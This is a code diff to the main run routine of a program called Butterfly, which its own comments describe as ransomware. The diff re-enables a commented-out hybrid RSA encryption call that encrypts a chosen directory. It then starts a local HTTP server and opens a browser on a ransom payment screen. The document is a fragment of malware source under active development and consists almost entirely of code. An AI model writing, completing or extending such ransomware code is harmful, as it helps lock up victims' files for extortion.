@@ -108,7 +108,7 @@ void Butterfly::run()
         server->run(false);
 
         std::unique_ptr<butterfly::Browser> browser(new butterfly::Browser("x-www-browser"));
-        // After encryption open the browser and visualize the ransom payment possibility
+        // After encryption open the browser and visualize the ransom payment screen
         browser->open("http://127.0.0.1:8080", false);
 
         // Blocking call to wait for the ransom payment
@@ -155,18 +155,19 @@ void Butterfly::run()
     else if ( !_args.encrypt.empty() )
     {
         std::cout << "Start Encryption from directory " << _args.encrypt << std::endl;
-        /*
+        // Start the encryption
         std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(butterfly::params::RSA_KEYSIZE));
         encryptor->invokeDir(_args.encrypt, _args.protection);
-        */
+
         // After encryption start http server, gui or wallpaper
         std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8080);
-        //server->run(false);
+        server->run(false);
 
         std::unique_ptr<butterfly::Browser> browser(new butterfly::Browser("x-www-browser"));
-        // After encryption open the browser and visualize the ransom payment possibility
+        // After encryption open the browser and visualize the ransom payment screen
         browser->open("http://127.0.0.1:8080", true);
-
+        // Finally stop the server
+        server->stop();
     }
     // Start only Decryption with the remote decrypted file
     else if ( !_args.decrypt.empty() && _args.serverpKey.empty())
